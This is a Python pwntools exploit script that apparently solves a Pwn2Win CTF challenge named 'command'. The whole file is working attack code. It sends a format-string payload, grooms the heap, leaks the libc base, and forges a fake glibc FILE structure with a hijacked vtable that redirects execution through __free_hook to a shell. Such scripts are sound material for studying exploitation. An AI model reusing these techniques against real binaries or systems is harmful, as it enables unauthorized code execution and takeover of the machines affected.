#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./command --host command.pwn2.win --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./command')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'command.pwn2.win'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# #sprintf second
#b *0x5555555554C0
#b *0x55555555523a
gdbscript = '''
b *0x55555555535a 
continue
'''.format(**locals())

def include_command(priority,cmd):
        io.recvuntil("> ")
        io.sendline("1")
        io.recvuntil("ity: ")
        io.sendline(str(priority))
        io.recvuntil("Command: ")
        io.send(cmd)
        io.recvline()

def review_command(index):
        io.recvuntil("> ")
        io.sendline("2")
        io.recvuntil("index: ")
        io.sendline(str(index))
        io.recvuntil("ity: ")
        io.recvline()
        io.recvuntil("Command: ")
        cmd=io.recvline()
        return cmd

def delete_command(index):
        io.recvuntil("> ")
        io.sendline("3")
        io.recvuntil("index: ")
        io.sendline(str(index))
        io.recvline()

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x80, b"\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd0, b"\x00")
    return struct
libc = ELF("libc.so.6")
envi={"LD_PRELOAD":"./libc-2.27.so"}

io = start(env=envi)

# if args.LOCAL:
#     input('attach debugger')

io.sendline("%*18$c%4$n")
#io.sendline('per')

for i in range(10):
        include_command(1,"A")

for i in range(9):
        delete_command(i)

for i in range(9):
        include_command(1,"B")
#_IO_setb

leak=review_command(8)[:-1]

off=0x3ebc42

libc_leak=u64(leak.ljust(8, b'\x00'))
libc_base=libc_leak-off
log.success(hex(libc_base))
libc.address = libc_base

delete_command(0)
#delete_command(1)
#free_hook = libc_base+0x3ed8e8



rip =  libc.address + 0x10a398#libc.symbols['system']

#io_str_overflow_ptr_addr =  libc.symbols['_IO_file_jumps'] + 0xd8
# Calculate the vtable by subtracting appropriate offset
io_str_overflow_ptr_addr = libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8
# Craft file struct
file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = libc.symbols["__free_hook"],
                        _IO_write_ptr = libc.symbols["__free_hook"],
                        _IO_write_base = 0,
                        _lock = libc.symbols["__free_hook"])

file_struct += p64(fake_vtable_addr)
log.info(hex(fake_vtable_addr))
# Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(rip)
log.info(hex(rip))
file_struct = file_struct.ljust(0x100, b"\x00")




include_command(0,file_struct)

#include_command(1337,p64(0xdeadbabe)) #this must be algined and be ona gadget addr
io.sendline('5')
io.sendline('5')

io.interactive()


